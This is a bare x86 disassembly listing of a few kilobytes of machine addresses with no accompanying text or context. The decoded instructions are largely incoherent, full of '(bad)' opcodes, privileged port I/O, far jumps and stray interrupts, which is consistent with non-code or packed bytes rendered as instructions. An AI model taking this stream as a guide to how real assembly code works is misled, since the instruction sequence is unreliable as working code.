  41fec2:	mov    ebx,0x9fd96918
  41fec7:	mov    dl,0x12
  41fec9:	js     0x41ff0c
  41fecb:	jle    0x41fe68
  41fecd:	(bad)  
  41fece:	in     al,dx
  41fecf:	cmc    
  41fed0:	call   0xf52:0x7516b140
  41fed7:	jmp    0x75cd103f
  41fedc:	mov    DWORD PTR [esi-0x7cf24df8],edi
  41fee2:	mov    edx,0xb5073792
  41fee7:	cmp    ebx,DWORD PTR [ebx+0x6e7adcb]
  41feed:	xor    bl,0x43
  41fef0:	sbb    al,0x4a
  41fef2:	div    ch
  41fef4:	test   DWORD PTR [ebx],esp
  41fef6:	xor    DWORD PTR [ebx-0x72],0xffffffef
  41fefa:	out    0xaf,al
  41fefc:	xor    DWORD PTR [ebx+ecx*1],edx
  41feff:	push   esp
  41ff00:	das    
  41ff01:	mov    ebp,0x72a7f2aa
  41ff06:	fidiv  WORD PTR [edi+0x53]
  41ff09:	xchg   edx,eax
  41ff0a:	adc    eax,DWORD PTR [ebp+0x18]
  41ff0d:	repz ror DWORD PTR [eax],1
  41ff10:	mov    ebx,0xb3b175cc
  41ff15:	into   
  41ff16:	ds xchg ebp,eax
  41ff18:	lea    edi,[edi]
  41ff1a:	out    dx,eax
  41ff1b:	or     DWORD PTR [eax-0x4f],ebx
  41ff1e:	push   esp
  41ff1f:	adc    al,0x19
  41ff21:	xbegin 0xee646fca
  41ff27:	pop    edi
  41ff28:	cs stc 
  41ff2a:	loop   0x41ff03
  41ff2c:	jecxz  0x41fee4
  41ff2e:	std    
  41ff2f:	mov    BYTE PTR ds:0x56dd6cab,bh
  41ff35:	sub    bh,ah
  41ff37:	popa   
  41ff38:	or     eax,0x3370ab4b
  41ff3d:	mov    ebx,DWORD PTR [ebx]
  41ff3f:	cld    
  41ff40:	mov    al,ds:0xd8c39574
  41ff45:	inc    edi
  41ff46:	sbb    al,0xf9
  41ff48:	loopne 0x41ff83
  41ff4a:	mov    edx,0xdd332729
  41ff4f:	mov    ds:0x1f3297a9,al
  41ff54:	pop    eax
  41ff55:	rcr    BYTE PTR [edx],cl
  41ff57:	pop    ebp
  41ff58:	mov    eax,ds:0xfbb64f90
  41ff5d:	iret   
  41ff5e:	test   DWORD PTR [esi-0x5a1db151],ecx
  41ff64:	xor    eax,0x886f70e4
  41ff69:	mov    eax,0x9e389f51
  41ff6e:	pushf  
  41ff6f:	xor    al,0xad
  41ff71:	test   al,0xa
  41ff73:	sbb    ebp,edi
  41ff75:	dec    ebp
  41ff76:	xor    eax,0x9bf5e3ce
  41ff7b:	jae    0x41ffa2
  41ff7d:	stos   DWORD PTR es:[edi],eax
  41ff7e:	rol    BYTE PTR [eax+0x66d55d6a],0xdb
  41ff85:	cmc    
  41ff86:	xor    cl,ch
  41ff88:	dec    eax
  41ff89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff8a:	and    ah,BYTE PTR [ebx-0x6ee514f6]
  41ff90:	sahf   
  41ff91:	or     eax,0x458761a5
  41ff96:	mov    dl,0xde
  41ff98:	xor    al,0xfc
  41ff9a:	xchg   ecx,eax
  41ff9b:	pop    ebp
  41ff9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff9d:	shl    BYTE PTR [edi+0x4ea5dcdf],cl
  41ffa3:	das    
  41ffa4:	pop    ebx
  41ffa5:	bound  edi,QWORD PTR [edi+0x3787e81e]
  41ffab:	int    0xf1
  41ffad:	jl     0x41ff3a
  41ffaf:	inc    esp
  41ffb0:	push   ebp
  41ffb1:	pop    esp
  41ffb2:	outs   dx,BYTE PTR ds:[esi]
  41ffb3:	fistp  WORD PTR [eax+0x23]
  41ffb6:	push   ss
  41ffb7:	push   ebx
  41ffb8:	mov    ebx,0x8c00cfd6
  41ffbd:	push   ecx
  41ffbe:	mov    ch,0xbe
  41ffc0:	mov    BYTE PTR [ebp+0x4c],ch
  41ffc3:	pop    edx
  41ffc4:	pop    esp
  41ffc5:	jno    0x41fff9
  41ffc7:	popf   
  41ffc8:	lea    esp,[eax]
  41ffca:	mov    ecx,0xef323ef2
  41ffcf:	int    0xcb
  41ffd1:	out    dx,al
  41ffd2:	(bad)  
  41ffd3:	and    al,0xf9
  41ffd5:	push   eax
  41ffd6:	test   BYTE PTR [eax],ch
  41ffd8:	cld    
  41ffd9:	sub    DWORD PTR [esi],0xffffff81
  41ffdc:	cdq    
  41ffdd:	xchg   esi,eax
  41ffde:	dec    ebp
  41ffdf:	out    dx,al
  41ffe0:	scas   al,BYTE PTR es:[edi]
  41ffe1:	cs mov bl,0x57
  41ffe4:	pop    esi
  41ffe5:	mov    BYTE PTR [ecx+0xa3d54a1],al
  41ffeb:	mov    ch,0x7f
  41ffed:	inc    eax
  41ffee:	pop    edx
  41ffef:	in     al,0x0
  41fff1:	xor    al,0xab
  41fff3:	icebp  
  41fff4:	push   ecx
  41fff5:	aaa    
  41fff6:	jno    0x41fff8
  41fff8:	jno    0x41ffc5
  41fffa:	jns    0x420031
  41fffc:	pop    ecx
  41fffd:	fnstenv [edx-0x6b423e2f]
  420003:	push   esp
  420004:	or     al,0x23
  420006:	inc    edx
  420007:	jae    0x420006
  420009:	inc    esi
  42000a:	cmp    ch,al
  42000c:	inc    esp
  42000d:	outs   dx,DWORD PTR ds:[esi]
  42000e:	cli    
  42000f:	sti    
  420010:	fcmovb st,st(3)
  420012:	cmp    DWORD PTR [edi-0x3dfec212],edi
  420018:	jp     0x41ffda
  42001a:	pusha  
  42001b:	fst    st(6)
  42001d:	(bad)  
  42001f:	push   ss
  420020:	push   ss
  420021:	xchg   ebp,eax
  420022:	lock cdq 
  420024:	sub    DWORD PTR [edi+0x1e859565],edx
  42002a:	neg    BYTE PTR [ecx]
  42002c:	or     DWORD PTR [edx-0x49],ebx
  42002f:	sar    ah,cl
  420031:	mov    ebp,0xd95c824a
  420036:	cmp    eax,0x7e6e65f3
  42003b:	jne    0x420020
  42003d:	addr16 xor eax,0x126e9040
  420043:	xor    ebx,eax
  420045:	ficom  DWORD PTR [edi+eax*2+0x118473aa]
  42004c:	inc    edi
  42004d:	push   ebp
  42004e:	and    eax,0x70117d7d
  420053:	pop    ecx
  420054:	inc    esp
  420055:	call   DWORD PTR [edi-0x58]
  420058:	mov    al,0xe
  42005a:	out    dx,al
  42005b:	je     0x42008e
  42005d:	xchg   esi,eax
  42005e:	add    eax,0x155969ae
  420063:	sbb    DWORD PTR [ebx+eiz*2+0x588445a6],esp
  42006a:	sub    BYTE PTR [ecx],0x1b
  42006d:	fidiv  DWORD PTR [ebp-0x782253ed]
  420073:	bound  ebx,QWORD PTR [eax]
  420075:	test   DWORD PTR [edi],0xb26b0810
  42007b:	mov    cl,al
  42007d:	sub    BYTE PTR [edx+0x4f],dl
  420080:	aad    0x6e
  420082:	push   0xffffffd1
  420084:	jl     0x420042
  420086:	xchg   esi,edi
  420088:	dec    edx
  420089:	push   ebp
  42008a:	inc    edx
  42008b:	das    
  42008c:	xchg   DWORD PTR [eax+0x532bc8d4],esi
  420092:	fstp   TBYTE PTR [esi-0x35]
  420095:	and    al,0x12
  420097:	dec    edi
  420098:	sbb    al,0x2c
  42009a:	lea    ecx,[esi+0x21]
  42009d:	xor    DWORD PTR [ebx+eax*1],ebp
  4200a0:	or     eax,0xb2f0b8ed
  4200a5:	getsec 
  4200a7:	inc    ebx
  4200a8:	lahf   
  4200a9:	mov    al,ds:0xd11b2b6c
  4200ae:	jbe    0x4200e7
  4200b0:	sbb    DWORD PTR [ecx+0x4c],0xffffffb7
  4200b4:	or     al,ah
  4200b6:	sub    ecx,DWORD PTR [ecx-0x6]
  4200b9:	cmp    eax,0xd377bd82
  4200be:	mov    esi,0xc91f3ea6
  4200c3:	arpl   WORD PTR [eax+eiz*2],di
  4200c6:	xlat   BYTE PTR ds:[ebx]
  4200c7:	sbb    edi,DWORD PTR [ebp-0x4b]
  4200ca:	xor    eax,0x74a637c5
  4200cf:	adc    DWORD PTR [edx+ebx*8+0x30],ebx
  4200d3:	bound  esp,QWORD PTR [edi+0x61]
  4200d6:	fadd   DWORD PTR [ecx-0x46]
  4200d9:	in     al,dx
  4200da:	mov    ds:0x75517ea0,eax
  4200df:	and    eax,0xec156b30
  4200e4:	stos   BYTE PTR es:[edi],al
  4200e5:	out    dx,al
  4200e6:	cmp    edi,DWORD PTR ds:0x81875dc5
  4200ec:	inc    esp
  4200ed:	cmp    DWORD PTR [ecx-0x4df6e88c],eax
  4200f3:	std    
  4200f4:	jmp    0x4200e3
  4200f6:	add    dh,ah
  4200f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200f9:	cmp    bl,BYTE PTR [esi]
  4200fb:	loope  0x42012b
  4200fd:	(bad)  
  4200fe:	mov    al,0x99
  420100:	shr    bh,cl
  420102:	aas    
  420103:	mov    eax,0xb01c0fc0
  420108:	(bad)  
  420109:	xchg   esi,eax
  42010a:	fnstsw WORD PTR [edi-0x39]
  42010d:	jmp    0x4200b0
  42010f:	sub    esi,edi
  420111:	arpl   WORD PTR [esp+ebp*8+0x23],dx
  420115:	(bad)  
  420116:	xchg   edi,eax
  420117:	mov    dh,BYTE PTR [esi+0x30]
  42011a:	pop    esp
  42011b:	ret    
  42011c:	sbb    edx,DWORD PTR [edi+0x72]
  42011f:	push   cs
  420120:	aam    0x24
  420122:	mov    dl,0xc2
  420124:	ins    DWORD PTR es:[edi],dx
  420125:	push   es
  420126:	and    eax,0xce7688d4
  42012b:	test   dl,bl
  42012d:	xor    eax,0x25e72fda
  420132:	and    dl,BYTE PTR [eax+eax*4+0x5b0afd69]
  420139:	dec    edx
  42013a:	add    BYTE PTR [ecx-0x63d15dd6],0xda
  420141:	jl     0x4200d6
  420143:	xchg   edx,eax
  420144:	stos   DWORD PTR es:[edi],eax
  420145:	ja     0x4200cf
  420147:	xor    ecx,DWORD PTR [eax+0x3aabaab5]
  42014d:	sbb    al,0x84
  42014f:	popf   
  420150:	shl    DWORD PTR ds:0xeec99deb,1
  420156:	mov    al,0xd8
  420158:	xor    DWORD PTR [eax+0x26],ebx
  42015b:	pusha  
  42015c:	hlt    
  42015d:	xchg   ebx,eax
  42015e:	ds ds ins BYTE PTR es:[edi],dx
  420161:	cmp    DWORD PTR [ebx+0x4a],esp
  420164:	push   ebx
  420165:	aaa    
  420166:	push   esp
  420167:	sbb    ah,ch
  420169:	add    edi,DWORD PTR [eax+0x6310e2]
  42016f:	push   ebp
  420170:	xor    BYTE PTR [edi+0x15fcbfb1],ah
  420176:	call   0x3675d4e
  42017b:	jge    0x42012c
  42017d:	shr    DWORD PTR [edx-0xa],0x46
  420181:	jl     0x4201e3
  420183:	test   DWORD PTR [ebx],ebx
  420185:	jmp    0x4ddc7a2b
  42018a:	retf   
  42018b:	add    ecx,DWORD PTR ds:0xeffa6574
  420191:	mov    DWORD PTR [ebx-0x73],edx
  420194:	mov    al,0xfd
  420196:	push   edi
  420197:	mov    eax,ds:0xf6ed5c
  42019c:	cs xor eax,0x5c32e60b
  4201a2:	fadd   DWORD PTR [eax]
  4201a4:	jno    0x420225
  4201a6:	pop    ss
  4201a7:	cmp    esi,DWORD PTR cs:[edx-0x1dd5c433]
  4201ae:	sub    BYTE PTR [eax-0x28083797],dh
  4201b4:	sub    DWORD PTR [eax-0x55],0xffffffc6
  4201b8:	push   cs
  4201b9:	fisubr WORD PTR [edi+0x4d]
  4201bc:	jbe    0x4201d9
  4201be:	ds jp  0x42022a
  4201c1:	sbb    DWORD PTR [ebx],0x3a78f8b8
  4201c7:	dec    edi
  4201c8:	push   esi
  4201c9:	or     BYTE PTR [ebx+0x22],0x2
  4201cd:	daa    
  4201ce:	repz and cl,BYTE PTR [esi+0x43]
  4201d2:	in     eax,0x8b
  4201d4:	inc    esp
  4201d5:	jmp    0x7856aab8
  4201da:	sub    DWORD PTR [esi],edx
  4201dc:	mov    BYTE PTR ds:0x1333f763,cl
  4201e2:	mov    DWORD PTR [ebp+0x1cf0e3a8],esi
  4201e8:	(bad)  
  4201e9:	sti    
  4201ea:	(bad)  
  4201eb:	fisttp WORD PTR [ebp+ebx*2-0x5a7f99ae]
  4201f2:	dec    ebp
  4201f3:	es push edx
  4201f5:	sti    
  4201f6:	pop    edi
  4201f7:	cmp    al,0x82
  4201f9:	loopne 0x420249
  4201fb:	std    
  4201fc:	stc    
  4201fd:	sbb    al,0x67
  4201ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420200:	loopne 0x420208
  420202:	ins    BYTE PTR es:[edi],dx
  420203:	mov    bh,BYTE PTR [eax-0x7113e561]
  420209:	test   al,0x9f
  42020b:	push   esi
  42020c:	and    BYTE PTR [edx+0x64],0x91
  420210:	sub    eax,0xc9ca8363
  420215:	fisttp DWORD PTR [esi-0x10]
  420218:	push   eax
  420219:	xor    al,0xfd
  42021b:	dec    ebp
  42021c:	xchg   edi,eax
  42021d:	push   ss
  42021e:	neg    BYTE PTR [eax]
  420220:	adc    eax,0x8c62cd31
  420225:	(bad)  
  420226:	pop    eax
  420227:	pop    ebp
  420228:	mov    esp,DWORD PTR gs:[edx-0x2210d7a4]
  42022f:	outs   dx,DWORD PTR ds:[esi]
  420230:	ret    
  420231:	adc    eax,0xafd3fecd
  420236:	sub    BYTE PTR [eax],al
  420238:	std    
  420239:	in     eax,0xb0
  42023b:	jnp    0x420280
  42023d:	outs   dx,DWORD PTR ds:[esi]
  42023e:	out    dx,eax
  42023f:	xor    DWORD PTR [ebp-0x4e3e7b45],esp
  420245:	add    eax,0x9ee60583
  42024a:	jmp    0xdcc0:0x51012514
  420251:	(bad)  
  420252:	imul   ecx,DWORD PTR [edx-0x2c],0xb5bd315d
  420259:	xchg   ebx,edx
  42025b:	and    BYTE PTR ds:0x52d9683,al
  420261:	out    dx,al
  420262:	call   0x993:0xebcb1f98
  420269:	cmp    ecx,0x59ccfe29
  42026f:	sbb    al,0xb
  420271:	hlt    
  420272:	cs mov ebp,0x64423401
  420278:	fs pop ecx
  42027a:	sub    al,0xd7
  42027c:	push   ecx
  42027d:	int    0x40
  42027f:	xor    DWORD PTR [edx],esi
  420281:	sub    al,0x8
  420283:	call   FWORD PTR ds:0xe98e7b33
  420289:	cmp    al,0xd5
  42028b:	or     al,0x7e
  42028d:	inc    esi
  42028e:	enter  0x5d18,0xd
  420292:	mov    BYTE PTR [eax+0x11],cl
  420295:	or     eax,0x3a207801
  42029a:	dec    eax
  42029b:	sahf   
  42029c:	into   
  42029d:	lock ret 
  42029f:	xor    edx,DWORD PTR [edi+eiz*1-0x34187a1d]
  4202a6:	lea    ebp,[edx+0x4c]
  4202a9:	test   al,0xf5
  4202ab:	lods   al,BYTE PTR ds:[esi]
  4202ac:	les    eax,FWORD PTR [edx]
  4202ae:	fnstenv ds:0x30f65224
  4202b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202b5:	mov    BYTE PTR [eax],dh
  4202b7:	ucomiss xmm0,xmm6
  4202ba:	iret   
  4202bb:	mov    ebp,0x5fe58bfb
  4202c0:	mul    DWORD PTR [edi-0x795f0b11]
  4202c6:	cs jo  0x420287
  4202c9:	sub    bh,BYTE PTR [edx-0x37ae1505]
  4202cf:	test   bh,cl
  4202d1:	adc    ebx,ecx
  4202d3:	mov    ebp,0xa9343c16
  4202d8:	push   eax
  4202d9:	dec    esi
  4202da:	jns    0x42032a
  4202dc:	sub    al,0x88
  4202de:	rcl    ch,cl
  4202e0:	(bad)  
  4202e1:	(bad)  
  4202e2:	pop    ebp
  4202e3:	or     eax,0xbcd022df
  4202e8:	call   0x31e2:0x6ca259e5
  4202ef:	enter  0x1aea,0x92
  4202f3:	xor    ch,BYTE PTR [esi]
  4202f5:	retf   0xfb94
  4202f8:	push   edx
  4202f9:	sub    dl,dh
  4202fb:	or     ch,ch
  4202fd:	minps  xmm7,XMMWORD PTR es:[ecx-0x47c17681]
  420305:	je     0x420322
  420307:	imul   esp,edx,0xc93a8b7f
  42030d:	push   0xffffffad
  42030f:	xor    al,0xbe
  420311:	int    0x7
  420313:	ins    BYTE PTR es:[edi],dx
  420314:	cmp    DWORD PTR [esi-0x27],esp
  420317:	xchg   ebp,eax
  420318:	sub    ebp,eax
  42031a:	retf   0x92
  42031d:	add    BYTE PTR [ebx-0x50],dl
  420320:	add    DWORD PTR [edi],ebp
  420322:	xchg   ecx,eax
  420323:	adc    BYTE PTR [ebp+0x205226ab],dl
  420329:	mov    esi,0xccbcab01
  42032e:	push   ecx
  42032f:	stc    
  420330:	add    ah,BYTE PTR [eax+ebx*8+0x4c]
  420334:	lock ins BYTE PTR es:[edi],dx
  420336:	pop    edx
  420337:	push   cs
  420338:	dec    eax
  420339:	in     eax,dx
  42033a:	out    dx,eax
  42033b:	repnz mov bh,0x38
  42033e:	mov    BYTE PTR [ebx-0x3d],bh
  420341:	sub    cl,dl
  420343:	and    al,0xfe
  420345:	xor    al,0x28
  420347:	and    eax,0xaad3f70d
  42034c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42034d:	mov    ah,0xa7
  42034f:	repnz mov edx,0xc091f77a
  420355:	mov    esi,0x891f7ff4
  42035a:	ss pop ds
  42035c:	lea    edx,[eax+0xba19922]
  420362:	push   edx
  420363:	jle    0x420352
  420365:	fmulp  st(0),st
  420367:	unpckhps xmm3,XMMWORD PTR [ebx+0x16de6185]
  42036e:	les    ecx,FWORD PTR [edx-0x2553f66a]
  420374:	mov    ebx,0xd3aaad34
  420379:	sbb    esi,0x1b76584f
  42037f:	mov    eax,ds:0x37b890f8
  420384:	retf   0xc3d7
  420387:	cmp    al,0x59
  420389:	pop    ecx
  42038a:	loop   0x4203d1
  42038c:	or     dh,BYTE PTR [esi+0x1585e95]
  420392:	in     al,dx
  420393:	daa    
  420394:	scas   eax,DWORD PTR es:[edi]
  420395:	xchg   esi,eax
  420396:	xor    ah,0xc1
  420399:	rcr    DWORD PTR [ebx-0x47],cl
  42039c:	sub    eax,0x909cd528
  4203a1:	repnz or BYTE PTR [ebp-0x2c],bh
  4203a5:	jge    0x42039f
  4203a7:	clc    
  4203a8:	xor    ebp,esp
  4203aa:	xchg   esi,eax
  4203ab:	(bad)  
  4203ac:	mov    eax,0x63d1771e
  4203b1:	popa   
  4203b2:	sar    DWORD PTR [eax],0x76
  4203b5:	sbb    ebp,0x4a
  4203b8:	jmp    0xaddd88a9
  4203bd:	rcr    DWORD PTR [edx-0x2b8d5ee4],0xa1
  4203c4:	mov    ecx,0x1ee7583d
  4203c9:	shr    DWORD PTR [ebx+0x14],1
  4203cc:	fld    DWORD PTR [ebp+0x7163be6b]
  4203d2:	popa   
  4203d3:	(bad)  
  4203d4:	cmp    eax,0xd1932deb
  4203d9:	dec    DWORD PTR [ecx]
  4203db:	int3   
  4203dc:	sahf   
  4203dd:	sbb    eax,0x8f63bb4c
  4203e2:	js     0x4203d1
  4203e4:	push   ebp
  4203e5:	inc    edi
  4203e6:	sahf   
  4203e7:	and    eax,0x196852da
  4203ec:	mov    eax,0xb0f1dfdd
  4203f1:	fisttp WORD PTR [ecx-0x5a3fc776]
  4203f7:	push   edx
  4203f8:	outs   dx,BYTE PTR ds:[esi]
  4203f9:	push   0x251f752a
  4203fe:	fld    QWORD PTR [eax+0x50]
  420401:	xlat   BYTE PTR ds:[ebx]
  420402:	and    edi,DWORD PTR [ecx-0x54]
  420405:	test   al,0x85
  420407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420408:	or     DWORD PTR [edi],edi
  42040a:	in     al,0x2d
  42040c:	loopne 0x4203bb
  42040e:	dec    ebp
  42040f:	inc    edi
  420410:	das    
  420411:	retf   
  420412:	icebp  
  420413:	pop    esp
  420414:	in     eax,0x7b
  420416:	in     al,dx
  420417:	mov    ah,0x40
  420419:	aam    0x19
  42041b:	mov    bh,0xbe
  42041d:	jge    0x42045c
  42041f:	rol    BYTE PTR [edx-0x29],0xb
  420423:	fstp   DWORD PTR [esi]
  420425:	inc    edx
  420426:	xchg   ebx,eax
  420427:	xlat   BYTE PTR ds:[ebx]
  420428:	aas    
  420429:	ja     0x4203ac
  42042b:	iret   
  42042c:	inc    ebx
  42042d:	mov    esp,0x98920fd2
  420432:	(bad)  
  420433:	sub    BYTE PTR [ecx-0x49cf8441],al
  420439:	dec    esi
  42043a:	adc    BYTE PTR [esi-0xcc76a7d],al
  420440:	leave  
  420441:	sar    BYTE PTR ds:0x5ef76020,1
  420447:	data16 jno 0x4203e3
  42044a:	mov    ebp,0xcc8f1dcb
  42044f:	and    dl,BYTE PTR [esi]
  420451:	xor    ah,ah
  420453:	out    0x9a,al
  420455:	cmp    ecx,DWORD PTR [esi]
  420457:	in     al,0x12
  420459:	sbb    ecx,DWORD PTR [esi+0x2d]
  42045c:	cmp    ebp,DWORD PTR [eax-0x25]
  42045f:	jb     0x420430
  420461:	inc    edi
  420462:	inc    ebp
  420463:	mov    ds:0xb0798dcb,al
  420468:	mov    ecx,0x21ed1f2d
  42046d:	imul   eax,DWORD PTR gs:[ecx-0x53998338],0xad8fb967
  420478:	outs   dx,BYTE PTR ds:[esi]
  42047a:	outs   dx,BYTE PTR ds:[esi]
  42047b:	mov    eax,0x916a1fe
  420480:	mov    dl,0x25
  420482:	mov    ebp,0x3e23c6e6
  420487:	jne    0x42042b
  420489:	mov    cl,dh
  42048b:	xchg   DWORD PTR [eax-0x38306650],edx
  420491:	int    0x7c
  420493:	jp     0x42041a
  420495:	nop
  420496:	and    ecx,DWORD PTR [edi-0x68]
  420499:	dec    ebx
  42049a:	mov    esi,0x1e85147c
  42049f:	mov    eax,ds:0xf7603221
  4204a4:	dec    edi
  4204a5:	stos   BYTE PTR es:[edi],al
  4204a6:	add    DWORD PTR [edx+0x3a28930f],0x41151b33
  4204b0:	push   cs
  4204b1:	mov    eax,ds:0xee060efd
  4204b6:	stos   DWORD PTR es:[edi],eax
  4204b7:	lahf   
  4204b8:	ins    DWORD PTR es:[edi],dx
  4204b9:	jnp    0x4204d2
  4204bb:	dec    esp
  4204bc:	lods   eax,DWORD PTR ds:[esi]
  4204bd:	rcr    DWORD PTR [edx+0x185f1e23],1
  4204c3:	(bad)  
  4204c4:	or     ch,BYTE PTR [ecx]
  4204c6:	mov    DWORD PTR [edx+0x3798fa58],edi
  4204cc:	xor    DWORD PTR [edx+ebx*8-0x6dbac8d3],ecx
  4204d3:	mov    dl,0x52
  4204d5:	in     eax,dx
  4204d6:	adc    BYTE PTR [esi],ah
  4204d8:	aad    0x49
  4204da:	sbb    dl,0xd5
  4204dd:	and    DWORD PTR [esi-0x51],ecx
  4204e0:	xlat   BYTE PTR ds:[ebx]
  4204e1:	ret    
  4204e2:	ja     0x4204d2
  4204e4:	pusha  
  4204e5:	ds hlt 
  4204e7:	aam    0x7e
  4204e9:	icebp  
  4204ea:	push   cs
  4204eb:	xchg   esi,eax
  4204ec:	aad    0xce
  4204ee:	retf   0x7647
  4204f1:	add    al,0xd7
  4204f3:	sar    DWORD PTR [edi+eax*8],cl
  4204f6:	in     al,0x38
  4204f8:	int    0x49
  4204fa:	sahf   
  4204fb:	dec    edx
  4204fc:	and    eax,0x2bd24eea
  420501:	jge    0x4204a9
  420503:	push   ss
  420504:	pop    esp
  420505:	add    al,0x60
  420507:	sahf   
  420508:	repz jo 0x4204b3
  42050b:	pop    esi
  42050c:	xlat   BYTE PTR ds:[ebx]
  42050d:	pop    edx
  42050e:	test   eax,0x4c87ac6c
  420513:	xchg   esi,eax
  420514:	sti    
  420515:	pushf  
  420516:	into   
  420517:	(bad)  
  420518:	dec    ebx
  420519:	call   FWORD PTR [edx]
  42051b:	and    DWORD PTR [ebp+0x981677c],ecx
  420521:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420522:	mov    BYTE PTR [ebx],dh
  420524:	jae    0x420521
  420526:	cmp    edx,esi
  420528:	adc    DWORD PTR [ecx-0x7e],edi
  42052b:	sar    DWORD PTR [ebp-0x5e17a7bb],cl
  420531:	inc    ecx
  420532:	fwait
  420533:	add    BYTE PTR cs:[ebp+eax*8-0x3e87294a],ch
  42053b:	(bad)  
  42053c:	retf   
  42053d:	cmp    eax,0x79fb1cab
  420542:	add    eax,0x152167f3
  420547:	icebp  
  420548:	add    BYTE PTR [esi-0x6a20dff6],bh
  42054e:	shl    BYTE PTR [edi+0x6d483e54],0x2a
  420555:	sub    cl,dl
  420557:	cmc    
  420558:	aaa    
  420559:	(bad)  
  42055a:	cmp    al,0xe6
  42055c:	dec    esp
  42055d:	push   esi
  42055e:	adc    eax,0xd0782383
  420563:	cld    
  420564:	iret   
  420565:	xchg   ebp,eax
  420566:	and    al,0xa1
  420568:	pushf  
  420569:	pop    es
  42056a:	into   
  42056b:	js     0x420583
  42056d:	pop    ecx
  42056e:	nop
  42056f:	outs   dx,DWORD PTR ds:[esi]
  420570:	dec    ecx
  420571:	retf   
  420572:	xchg   edx,eax
  420573:	cwde   
  420574:	lahf   
  420575:	sub    eax,0xeae97c78
  42057a:	in     eax,0x63
  42057c:	mov    ebp,0xce9e3fb8
  420581:	imul   ebp,DWORD PTR [ebp+0xf1b5397],0xffffffb3
  420588:	daa    
  420589:	add    esi,ebx
  42058b:	pop    ss
  42058c:	fld    st(6)
  42058e:	add    al,0xe
  420590:	nop
  420591:	in     eax,dx
  420592:	push   esp
  420593:	rol    DWORD PTR [ecx+0x57],cl
  420596:	push   es
  420597:	jp     0x420559
  420599:	outs   dx,BYTE PTR ds:[esi]
  42059a:	clc    
  42059b:	cld    
  42059c:	arpl   cx,cx
  42059e:	int    0x95
  4205a0:	and    DWORD PTR [ecx-0x7b],esi
  4205a3:	les    esp,FWORD PTR [esi-0x68]
  4205a6:	shl    BYTE PTR [esi],1
  4205a8:	xor    eax,0x4a524119
  4205ad:	ficomp DWORD PTR [edi+0x50]
  4205b0:	mov    ah,0x61
  4205b2:	and    DWORD PTR [eax],eax
  4205b4:	idiv   BYTE PTR ds:0x5d51ee79
  4205ba:	sahf   
  4205bb:	sub    al,0x9a
  4205bd:	gs dec edi
  4205bf:	pop    ebp
  4205c0:	dec    ecx
  4205c1:	or     al,0x20
  4205c3:	sbb    eax,0x178c24ce
  4205c8:	dec    ebx
  4205c9:	stos   BYTE PTR es:[edi],al
  4205ca:	mov    esi,0x84e3b25c
  4205cf:	ss test ah,0xb3
  4205d3:	sti    
  4205d4:	xchg   DWORD PTR [ecx-0x33],ecx
  4205d7:	xchg   esp,eax
  4205d8:	dec    edx
  4205d9:	mov    dh,0x5c
  4205db:	call   0xfcef97c1
  4205e0:	sub    ebp,DWORD PTR [edx]
  4205e2:	mov    ecx,0x408a88c6
  4205e7:	xchg   ecx,eax
  4205e8:	jmp    0x42056d
  4205ea:	leave  
  4205eb:	push   cs
  4205ec:	push   0xffffffea
  4205ee:	jmp    0x4205ef
  4205f0:	test   eax,0x5d03fd00
  4205f5:	inc    eax
  4205f6:	sub    eax,0x90df1cbb
  4205fb:	mov    al,ds:0xa1c1de56
  420600:	and    dh,ah
  420602:	inc    esp
  420603:	adc    bl,BYTE PTR [eax-0x538861ca]
  420609:	push   edi
  42060a:	dec    ebx
  42060b:	push   ss
  42060c:	stc    
  42060d:	(bad)  
  42060e:	fcomp  QWORD PTR [esi+0x393d5073]
  420614:	call   FWORD PTR [ebp-0x62e334]
  42061a:	jnp    0x420637
  42061c:	pop    esp
  42061d:	aaa    
  42061e:	mov    ch,0x89
  420620:	ss loop 0x4205b0
  420623:	mov    al,ds:0xd0ceb201
  420628:	mov    eax,0x8adbda6a
  42062d:	fnstsw WORD PTR [ebx-0x4]
  420630:	mov    ds:0x6c42bd77,al
  420635:	int3   
  420636:	xchg   esi,eax
  420637:	cli    
  420638:	inc    esp
  420639:	ror    DWORD PTR [edx+0x38f72d27],1
  42063f:	cmp    BYTE PTR [ebp-0x1a],bl
  420642:	or     DWORD PTR [esi-0x674326c],ebx
  420648:	popa   
  420649:	(bad)  
  42064b:	ficom  WORD PTR [ecx+0x6064e984]
  420651:	lods   eax,DWORD PTR ds:[esi]
  420652:	outs   dx,BYTE PTR ds:[esi]
  420653:	push   esi
  420654:	and    eax,0x2a0fbe83
  420659:	comiss xmm4,xmm5
  42065c:	pop    esi
  42065d:	sub    al,0x62
  42065f:	xor    ch,BYTE PTR ds:0xf39cc7c1
  420665:	in     al,dx
  420666:	loop   0x420660
  420668:	pushf  
  420669:	ss sub DWORD PTR cs:[esi],ebp
  42066d:	inc    ecx
  42066e:	sahf   
  42066f:	cmp    BYTE PTR [edx-0x46700f65],cl
  420675:	push   esp
  420676:	int3   
  420677:	jmp    FWORD PTR [edx-0x56fa9646]
  42067d:	push   0x441fa027
  420682:	sti    
  420683:	push   ebx
  420684:	enter  0x26f3,0x84
  420688:	push   es
  420689:	arpl   WORD PTR [edi-0x10],dx
  42068c:	bound  esi,QWORD PTR [esi]
  42068e:	sbb    cl,BYTE PTR [ebx-0x52]
  420691:	inc    esi
  420692:	cld    
  420693:	and    eax,0xd3143063
  420698:	stos   BYTE PTR es:[edi],al
  420699:	and    ch,BYTE PTR [ecx-0x6c902684]
  42069f:	push   ebx
  4206a0:	and    al,0x79
  4206a2:	push   0x97891278
  4206a7:	jno    0x4206d8
  4206a9:	cmc    
  4206aa:	je     0x4206e7
  4206ac:	inc    ebx
  4206ad:	std    
  4206ae:	mov    ch,0xc1
  4206b0:	aam    0x5
  4206b2:	jge    0x42068a
  4206b4:	in     eax,0x98
  4206b6:	nop
  4206b7:	scas   al,BYTE PTR es:[edi]
  4206b8:	mov    ah,bl
  4206ba:	rcl    BYTE PTR [esi-0x3ca5d7f7],1
  4206c0:	sub    BYTE PTR [ecx-0x5c],dh
  4206c3:	mov    BYTE PTR [eax-0x7d694f5e],dh
